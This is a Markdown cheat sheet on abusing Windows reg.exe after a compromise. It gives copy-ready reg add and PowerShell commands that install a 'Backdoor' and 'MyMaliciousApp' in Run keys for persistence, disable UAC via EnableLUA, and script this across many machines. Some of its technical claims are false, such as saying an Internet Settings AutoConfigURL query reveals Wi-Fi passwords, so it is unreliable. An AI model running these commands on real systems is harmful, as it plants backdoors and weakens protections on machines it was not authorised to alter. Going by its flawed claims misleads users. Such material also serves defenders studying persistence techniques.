# Reg

**Type**: Post-Exploitation, Persistence
**Focus**: **Reg** is a Windows registry manipulation tool that can be used for various post-exploitation activities. Attackers and penetration testers can use Reg to add, modify, or delete registry keys to **maintain persistence**, **escalate privileges**, or **retrieve sensitive information**.

---

## 1. Overview

* **Purpose**: The Reg tool is primarily used for manipulating the Windows registry. This can help establish persistence on a compromised system by modifying registry keys, **creating startup entries**, or even retrieving credentials and other sensitive data stored in the registry.
* **Key Features**:

  * Modify or add registry entries to maintain persistence.
  * Dump registry keys or values that contain **sensitive information** like passwords or configuration details.
  * Perform tasks like **startup manipulation** and **privilege escalation** via registry changes.

---

## 2. Usage

### 2.1 Basic Commands for Interacting with Windows Registry

**View a registry key**:

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

This command lists the registry keys in the **Run** section, which is where programs set to run automatically are stored.

**Add a registry key**:

```bash
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyApp" /t REG_SZ /d "C:\path\to\app.exe" /f
```

This command adds a new registry entry to the **Run** section to make sure the application runs every time the system starts.

**Delete a registry key**:

```bash
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyApp" /f
```

This command deletes the registry entry for **MyApp** from the **Run** section.

### 2.2 Modify Windows Startup Behavior

**Set a registry entry to run a program at startup**:

```bash
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\path\to\backdoor.exe" /f
```

This command ensures that a **backdoor** will run automatically every time the system is booted.

---

## 3. Advanced Techniques

### 3.1 Persistence via Windows Registry

Persistence can be established through the registry by creating **startup entries** in specific locations like:

* **HKCU\Software\Microsoft\Windows\CurrentVersion\Run**
* **HKLM\Software\Microsoft\Windows\CurrentVersion\Run**
* **HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run**

Here’s an example of adding a persistence entry in **HKLM** (which affects all users):

```bash
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyMaliciousApp" /t REG_SZ /d "C:\path\to\malicious.exe" /f
```

This will ensure that the **malicious application** runs every time any user logs into the system.

### 3.2 Escalating Privileges

Sometimes, privilege escalation can be done by manipulating **registry keys** that affect security settings or user privileges.

For example, modifying the registry keys that control **User Account Control (UAC)** settings:

```bash
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f
```

Disabling **LUA (Least User Access)** can lower the security restrictions of UAC and might allow the attacker to bypass certain restrictions.

### 3.3 Credential Harvesting from the Registry

Windows stores sensitive data, including **password hashes**, **Wi-Fi passwords**, and other credentials, in the registry. For instance:

#### Retrieving stored Wi-Fi passwords

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "AutoConfigURL"
```

This registry query might reveal stored Wi-Fi network credentials or proxy settings that could be of interest in a post-exploitation scenario.

---

## 4. Best Practices

### 4.1 Use for Persistence

When establishing persistence, it's critical to choose the right registry location:

* **HKCU\Software\Microsoft\Windows\CurrentVersion\Run**: Only affects the current user.
* **HKLM\Software\Microsoft\Windows\CurrentVersion\Run**: Affects all users on the machine (useful for **escalating privileges**).
* **HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run**: A less common persistence vector that is harder for AV tools to detect.

### 4.2 Use Caution with Modifying Registry Entries

* **Backup** the registry before making modifications.
* Use **administrative privileges** to modify registry entries that affect system-wide settings (e.g., **HKLM**).
* Understand the **impact** of each registry change, as it can affect system stability.

---

## 5. Automation

You can automate reg-related tasks using **PowerShell** or **batch scripts**. Example of a PowerShell script to create a persistence key:

```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyBackdoor" -Value "C:\path\to\backdoor.exe" -PropertyType String -Force
```

This allows you to script the creation of persistence in multiple systems during a large-scale engagement.

---

